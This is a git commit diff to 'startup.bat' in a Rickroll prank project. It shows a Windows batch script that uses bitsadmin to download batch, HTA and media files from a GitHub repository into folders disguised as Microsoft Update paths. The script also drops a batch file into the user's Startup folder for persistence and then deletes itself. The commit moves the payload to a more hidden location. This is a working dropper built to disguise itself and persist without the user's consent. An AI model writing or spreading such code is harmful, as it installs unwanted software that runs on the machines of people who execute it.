ab5e8eff694a7b797b050b1bd0d3fc95aeec6ec3
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 20:38:19 +0800

    Update startup.bat

--- Projects/Rickroll/startup.bat
+++ Projects/Rickroll/startup.bat
@@ -2,10 +2,10 @@
 
 cls
 
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/bgwork.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrklbg.bat"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/rick.hta" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrkl.hta"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/bgwork.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/rick.hta" "%AppData%\Microsoft\Update\msrkl.hta"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/msrkl.gif" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.gif"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/msrkl.mp3" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.mp3"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
 
 del startup.bat
